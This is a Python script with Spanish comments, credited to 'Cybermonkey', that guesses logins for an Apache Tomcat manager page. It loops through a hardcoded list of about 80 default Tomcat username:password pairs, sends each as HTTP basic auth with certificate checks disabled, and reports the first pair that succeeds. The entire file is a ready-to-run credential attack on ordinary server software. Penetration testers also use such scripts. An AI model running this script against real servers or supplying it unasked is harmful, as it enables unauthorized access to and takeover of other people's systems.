#!/usr/bin/env python3
"""
@author: Cybermonkey | cybermonkey20@proton.me

Credenciales de Apache Tomcat inicio de sesion por fuerza bruta con la lista de nombre de usuario/contrasenya predeterminada de Tomcat. 
Entonces tecnicamente no es fuerza bruta :)
"""

import requests
import argparse
import urllib3


urllib3.disable_warnings()

credenciales = [
    'admin:',
    'admin:admanager',
    'admin:admin',
    'admin:admin',
    'ADMIN:ADMIN',
    'admin:adrole1',
    'admin:adroot',
    'admin:ads3cret',
    'admin:adtomcat',
    'admin:advagrant',
    'admin:password',
    'admin:password1',
    'admin:Password1',
    'admin:tomcat',
    'admin:vagrant',
    'both:admanager',
    'both:admin',
    'both:adrole1',
    'both:adroot',
    'both:ads3cret',
    'both:adtomcat',
    'both:advagrant',
    'both:tomcat',
    'cxsdk:kdsxc',
    'j2deployer:j2deployer',
    'manager:admanager',
    'manager:admin',
    'manager:adrole1',
    'manager:adroot',
    'manager:ads3cret',
    'manager:adtomcat',
    'manager:advagrant',
    'manager:manager',
    'ovwebusr:OvW*busr1',
    'QCC:QLogic66',
    'role1:admanager',
    'role1:admin',
    'role1:adrole1',
    'role1:adroot',
    'role1:ads3cret',
    'role1:adtomcat',
    'role1:advagrant',
    'role1:role1',
    'role1:tomcat',
    'role:changethis',
    'root:admanager',
    'root:admin',
    'root:adrole1',
    'root:adroot',
    'root:ads3cret',
    'root:adtomcat',
    'root:advagrant',
    'root:changethis',
    'root:owaspbwa',
    'root:password',
    'root:password1',
    'root:Password1',
    'root:r00t',
    'root:root',
    'root:toor',
    'tomcat:',
    'tomcat:admanager',
    'tomcat:admin',
    'tomcat:admin',
    'tomcat:adrole1',
    'tomcat:adroot',
    'tomcat:ads3cret',
    'tomcat:adtomcat',
    'tomcat:advagrant',
    'tomcat:changethis',
    'tomcat:password',
    'tomcat:password1',
    'tomcat:s3cret',
    'tomcat:s3cret',
    'tomcat:tomcat',
    'xampp:xampp',
    'server_admin:owaspbwa',
    'admin:owaspbwa',
    'demo:demo'
]

def brute(args):
    """
    Iterar sobre los pares de inicio de sesion: contrasenya de la matriz de credenciales y enviar la solicitud GET a
     Apache Tomcat con encabezado de autorizacion establecido
   
    Si el HTTP nos respone un codigo 200, nos dira que las credeciales son validas
    """
    url = "{}://{}:{}/{}".format(args.proto.lower(), args.host, args.port, args.manager)
    for lp in credenciales:
        (login, password) = lp.split(':')
        print("[.] Intentando Credenciales {}:{}..................................................\r".format(login, password), end="")
        resp = requests.get(
            url=url,
            auth=(login, password),
            verify=False
        )

        # 401 Unauthorized ?
        if resp.status_code == 200:
            return (login, password)

    return (False, False)


def main():
    """
    Menu prinipal
    """
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-H", "--host", help="Apache Tomcat hostname")
    parser.add_argument(
        "-P", "--proto", help="Protocol: http or https", choices=['http', 'https'])
    parser.add_argument(
        "-m", "--manager", help="Path to Host Manager (default: /manager/html)", default="manager/html"
    )
    parser.add_argument(
        "-p", "--port", type=int, default=8080, help="port (default - 8080)")

    args = parser.parse_args()

    (login, password) = brute(args)

    if login != False:
        print("[+] BOOM! Se han encontrado las sigientes credenciales: {}:{}".format(login, password))
    else:
        print("[-] No se han encontrado ninguna credencial :(")

    exit(0)



main()
